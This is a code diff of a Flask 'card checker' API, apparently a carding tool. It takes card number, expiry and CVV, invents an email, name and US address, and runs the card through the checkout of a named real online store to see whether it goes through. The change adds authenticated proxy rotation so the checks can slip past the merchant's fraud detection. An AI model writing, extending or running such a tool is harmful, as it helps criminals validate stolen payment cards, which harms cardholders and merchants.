@@ -9,22 +9,49 @@ from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
+def get_proxy_dict(proxy_string):
+    if not proxy_string:
+        return None
+    try:
+        parts = proxy_string.split(':')
+        if len(parts) == 4:
+            ip, port, username, password = parts
+            proxy_url = f"http://{username}:{password}@{ip}:{port}"
+            return {
+                'http': proxy_url,
+                'https': proxy_url
+            }
+        elif len(parts) == 2:
+            ip, port = parts
+            proxy_url = f"http://{ip}:{port}"
+            return {
+                'http': proxy_url,
+                'https': proxy_url
+            }
+        else:
+            return None
+    except:
+        return None
+
 @app.route('/check', methods=['GET', 'POST'])
 def check_card():
     if request.method == 'GET':
         cc = request.args.get('cc')
-        if not cc:
-            return jsonify({'error': 'Card details required. Use: ?cc=number|month|year|cvv'}), 400
+        proxy_string = request.args.get('proxy')
     else:
         data = request.json
         cc = data.get('cc') or data.get('card')
-        if not cc:
-            return jsonify({'error': 'Card details required'}), 400
+        proxy_string = data.get('proxy')
+    
+    if not cc:
+        return jsonify({'error': 'Card details required. Use: ?cc=number|month|year|cvv'}), 400
     
     try:
         cc, mm, yy, cvv = cc.split('|')
     except ValueError:
         return jsonify({'error': 'Invalid card format. Use: number|month|year|cvv'}), 400
+    
+    proxy_dict = get_proxy_dict(proxy_string)
     
     random5 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
     email = f"hunterjsidt{random5}@gmail.com"
@@ -69,6 +96,9 @@ def check_card():
     
     addr = random.choice(us_addresses)
     r = Session()
+    
+    if proxy_dict:
+        r.proxies.update(proxy_dict)
     
     url = "https://silvercellwireless.com"
     params = {'add-to-cart': "1203", 'quantity': "1"}
@@ -417,7 +447,14 @@ def check_card():
     else:
         result = "Unknown error"
     
-    return jsonify({'result': result, 'email': email, 'first_name': first_name, 'last_name': last_name, 'address': addr}), 200
+    return jsonify({
+        'result': result,
+        'email': email,
+        'first_name': first_name,
+        'last_name': last_name,
+        'address': addr,
+        'proxy_used': proxy_string if proxy_dict else None
+    }), 200
 
 @app.route('/health', methods=['GET'])
 def health():
@@ -425,4 +462,7 @@ def health():
 
 @app.route('/', methods=['GET'])
 def home():
-    return jsonify({'message': 'API is running. Use /check?cc=number|month|year|cvv'}), 200
+    return jsonify({
+        'message': 'API is running',
+        'usage': '/check?cc=number|month|year|cvv&proxy=ip:port:user:pass (optional)'
+    }), 200
